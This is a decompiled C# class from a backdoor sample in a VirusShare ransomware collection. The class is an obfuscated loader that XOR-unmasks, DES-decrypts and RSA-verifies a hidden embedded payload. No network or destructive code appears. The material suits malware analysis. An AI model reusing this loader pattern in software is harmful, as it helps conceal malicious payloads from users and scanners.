// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Protected, Version=6.2.8400.0, Culture=neutral, PublicKeyToken=null
// MVID: 52CBE997-50C3-42B2-A704-C908D57869A5
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Backdoor.Win32.Generic-2a8dca5794c095ea67845468a3fd0a8e91a24bf3f0bb5e0ec6c16a6579cc4e90.exe

using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;

internal class \uE031
{
  private static byte[] \uE000 = new byte[4];
  private static byte[] \uE001 = new byte[4];

  static \uE031()
  {
    \uE031.\uE000[0] = \uE031.\uE001[0] = (byte) 82;
    \uE031.\uE000[1] = \uE031.\uE001[1] = (byte) 83;
    \uE031.\uE000[2] = \uE031.\uE001[2] = (byte) 65;
    \uE031.\uE000[3] = (byte) 49;
    \uE031.\uE001[3] = (byte) 50;
  }

  public static MemoryStream \uE000(Stream _param0)
  {
    BinaryReader binaryReader1 = new BinaryReader(_param0);
    DESCryptoServiceProvider cryptoServiceProvider1 = new DESCryptoServiceProvider();
    bool flag1 = binaryReader1.ReadBoolean();
    int count1 = (int) binaryReader1.ReadUInt16();
    byte[] buffer1 = new byte[count1];
    binaryReader1.Read(buffer1, 0, count1);
    if (flag1)
    {
      byte[] buffer2 = new byte[6];
      binaryReader1.Read(buffer2, 0, 6);
      for (int index = 0; index < count1; ++index)
        buffer1[index] = (byte) ((uint) buffer1[index] ^ (uint) buffer2[index % 6]);
    }
    BinaryReader binaryReader2 = new BinaryReader((Stream) new MemoryStream(buffer1, false));
    binaryReader2.ReadString();
    bool flag2 = binaryReader2.ReadBoolean();
    int count2 = binaryReader2.ReadInt32();
    byte[] buffer3 = new byte[count2];
    binaryReader2.Read(buffer3, 0, count2);
    bool flag3 = binaryReader2.ReadBoolean();
    int count3 = (int) binaryReader2.ReadByte();
    byte[] buffer4 = new byte[count3];
    binaryReader2.Read(buffer4, 0, count3);
    cryptoServiceProvider1.IV = buffer4;
    int count4 = (int) binaryReader2.ReadByte();
    byte[] numArray = new byte[count4];
    if (flag3)
      binaryReader2.Read(numArray, 0, count4);
    RSACryptoServiceProvider cryptoServiceProvider2 = (RSACryptoServiceProvider) null;
    if (!flag3)
    {
      byte[] publicKey = Assembly.GetExecutingAssembly().GetName().GetPublicKey();
      if (publicKey == null || publicKey.Length != 160)
        throw new InvalidOperationException();
      Buffer.BlockCopy((Array) publicKey, 12, (Array) numArray, 0, count4);
      numArray[5] |= (byte) 128;
      cryptoServiceProvider2 = new RSACryptoServiceProvider();
      cryptoServiceProvider2.ImportParameters(\uE031.\uE000(publicKey));
    }
    cryptoServiceProvider1.Key = numArray;
    MemoryStream memoryStream = new MemoryStream();
    using (CryptoStream cryptoStream = new CryptoStream(binaryReader1.BaseStream, cryptoServiceProvider1.CreateDecryptor(), CryptoStreamMode.Read))
    {
      if (flag2)
        \uE02F.\uE000((Stream) cryptoStream, (Stream) memoryStream);
      else
        \uE031.\uE000((Stream) cryptoStream, (Stream) memoryStream);
    }
    if (cryptoServiceProvider2 != null)
    {
      memoryStream.Position = 0L;
      if (!\uE031.\uE000(cryptoServiceProvider2, (Stream) memoryStream, buffer3))
        throw new InvalidOperationException();
    }
    memoryStream.Position = 0L;
    return memoryStream;
  }

  private static byte[] \uE000(byte[] _param0, int _param1, int _param2)
  {
    if (_param0 == null || _param0.Length < _param1 + _param2)
      return (byte[]) null;
    byte[] destinationArray = new byte[_param2];
    Array.Copy((Array) _param0, _param1, (Array) destinationArray, 0, _param2);
    return destinationArray;
  }

  private static void \uE000(Stream _param0, Stream _param1)
  {
    byte[] buffer = new byte[4096];
    while (true)
    {
      int count = _param0.Read(buffer, 0, buffer.Length);
      if (count > 0)
        _param1.Write(buffer, 0, count);
      else
        break;
    }
  }

  private static RSAParameters \uE000(byte[] _param0)
  {
    bool flag = _param0.Length == 160;
    if (flag && !\uE031.\uE000(_param0, \uE031.\uE000, 20))
      return new RSAParameters();
    if (!flag && !\uE031.\uE000(_param0, \uE031.\uE001, 8))
      return new RSAParameters();
    RSAParameters rsaParameters = new RSAParameters();
    int num1 = (flag ? 20 : 8) + 8;
    int num2 = 4;
    rsaParameters.Exponent = \uE031.\uE000(_param0, num1, num2);
    Array.Reverse((Array) rsaParameters.Exponent);
    int num3 = num1 + num2;
    int num4 = 128;
    rsaParameters.Modulus = \uE031.\uE000(_param0, num3, num4);
    Array.Reverse((Array) rsaParameters.Modulus);
    if (flag)
      return rsaParameters;
    int num5 = num3 + num4;
    int num6 = 64;
    rsaParameters.P = \uE031.\uE000(_param0, num5, num6);
    Array.Reverse((Array) rsaParameters.P);
    int num7 = num5 + num6;
    int num8 = 64;
    rsaParameters.Q = \uE031.\uE000(_param0, num7, num8);
    Array.Reverse((Array) rsaParameters.Q);
    int num9 = num7 + num8;
    int num10 = 64;
    rsaParameters.DP = \uE031.\uE000(_param0, num9, num10);
    Array.Reverse((Array) rsaParameters.DP);
    int num11 = num9 + num10;
    int num12 = 64;
    rsaParameters.DQ = \uE031.\uE000(_param0, num11, num12);
    Array.Reverse((Array) rsaParameters.DQ);
    int num13 = num11 + num12;
    int num14 = 64;
    rsaParameters.InverseQ = \uE031.\uE000(_param0, num13, num14);
    Array.Reverse((Array) rsaParameters.InverseQ);
    int num15 = num13 + num14;
    int num16 = 128;
    rsaParameters.D = \uE031.\uE000(_param0, num15, num16);
    Array.Reverse((Array) rsaParameters.D);
    return rsaParameters;
  }

  private static bool \uE000(byte[] _param0, byte[] _param1, int _param2)
  {
    for (int index = 0; index < _param1.Length; ++index)
    {
      if ((int) _param0[index + _param2] != (int) _param1[index])
        return false;
    }
    return true;
  }

  private static bool \uE000(RSACryptoServiceProvider _param0, Stream _param1, byte[] _param2)
  {
    byte[] hash = new SHA1CryptoServiceProvider().ComputeHash(_param1);
    string name = new string('S', 1) + (object) 'H' + (object) 'A' + (object) '1';
    return _param0.VerifyHash(hash, CryptoConfig.MapNameToOID(name), _param2);
  }
}
